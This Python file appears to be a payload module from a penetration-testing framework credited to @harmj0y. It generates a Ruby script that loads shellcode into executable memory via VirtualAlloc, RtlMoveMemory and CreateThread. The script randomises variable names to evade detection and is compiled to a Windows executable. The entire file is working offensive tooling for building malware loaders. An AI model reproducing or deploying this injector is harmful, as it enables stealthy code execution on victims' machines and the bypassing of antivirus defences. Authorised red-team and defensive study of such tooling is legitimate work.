"""

Ruby inline shellcode injector

TODO: better randomization


Module built by @harmj0y

"""


from modules.common import shellcode
from modules.common import helpers

class Payload:
    
    def __init__(self):
        # required options
        self.description = "VirtualAlloc pattern for shellcode injection"
        self.language = "ruby"
        self.extension = "rb"
        self.rating = "Normal"

        # optional
        self.shellcode = shellcode.Shellcode()

        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"]}


    def generate(self):

        Shellcode = self.shellcode.generate()

        # randomly generate out variable names
        payloadName = helpers.randomString()
        ptrName = helpers.randomString()
        threadName = helpers.randomString()

        payloadCode = "require 'rubygems'\n"
        payloadCode += "require 'win32/api'\n"
        payloadCode += "include Win32\n"
        payloadCode += "exit if Object.const_defined?(:Ocra)\n"
        payloadCode += "puts 1\n"
        payloadCode += "v = API.new('VirtualAlloc', 'IIII', 'I');r = API.new('RtlMoveMemory', 'IPI', 'V');c = API.new('CreateThread', 'IIIIIP', 'I');w = API.new('WaitForSingleObject', 'II', 'I')\n"
        payloadCode += "puts 2\n"
        payloadCode += "%s = \"%s\"\n" %(payloadName, Shellcode)
        payloadCode += "puts 3\n"
        payloadCode += "%s = v.call(0,(%s.length > 0x1000 ? %s.length : 0x1000), 0x1000, 0x40)\n" %(ptrName,payloadName,payloadName)
        payloadCode += "puts 4\n"
        payloadCode += "x = r.call(%s,%s,%s.length); %s = c.call(0,0,%s,0,0,0); x = w.call(%s,0xFFFFFFF)\n" %(ptrName,payloadName,payloadName,threadName,ptrName,threadName)

        return payloadCode

